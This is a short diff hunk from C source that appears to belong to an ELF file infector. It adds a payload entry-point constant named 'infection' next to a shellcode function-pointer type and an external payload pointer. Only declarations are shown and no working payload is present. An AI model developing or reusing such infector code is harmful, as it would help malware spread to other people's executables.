@@ -22,6 +22,8 @@ struct  bfile {
   Elf64_Ehdr  *header;
 };
 
+#define PAYLOAD_EP "infection"
+
 typedef int (*shellcode)(void *(*dlsym)(void *, const char *), void *handle, const char *dirname,  const char *filename, const char *payload);
 
 extern const char *payload;
